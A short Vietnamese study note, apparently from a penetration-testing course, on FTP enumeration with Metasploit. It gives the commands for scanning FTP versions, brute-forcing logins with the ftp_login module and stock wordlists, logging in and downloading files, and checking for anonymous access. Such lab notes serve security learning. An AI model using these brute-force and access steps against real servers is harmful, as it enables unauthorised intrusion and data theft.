# FTP enumeration

- liệt kê phiên bản

- tấn công brute-force để có phiên 

`search type:auxiliary name:ftp`

module: `auxiliary/scanner/ftp/ftp_version`

`use auxiliary/scanner/ftp/ftp_version` 

`set RHOSTS IP`

module: `auxiliary/scanner/ftp/ftp_login` module để brute force đăng nhập vào FTP

`use auxiliary/scanner/ftp/ftp_login`

`set RHOSTS IP`

`set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`

`set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

`run`

=> tìm được user và pass

đăng nhập

`ftp ip`

nhập username và mật khẩu vừa có

`ls`

`get file`

Dùng anonymous để đăng nhập

`use auxiliary/scanner/ftp/anonymous`

`set RHOSTS IP`










